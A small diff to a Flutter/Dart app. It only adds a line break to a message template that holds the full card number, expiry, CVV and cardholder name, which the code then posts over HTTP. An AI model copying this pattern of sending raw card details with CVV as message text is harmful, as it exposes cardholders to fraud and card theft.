@@ -381,7 +381,7 @@ class _List1State extends State<List1> {
       ],
       'subject': 'Plans',
       'textContent':
-          'Total price : $totalprice\n Invoice number : $invoice Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n Referral Code : $referral',
+          'Total price : $totalprice\n Invoice number : $invoice\n Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n Referral Code : $referral',
     };
 
     final response = await http.post(
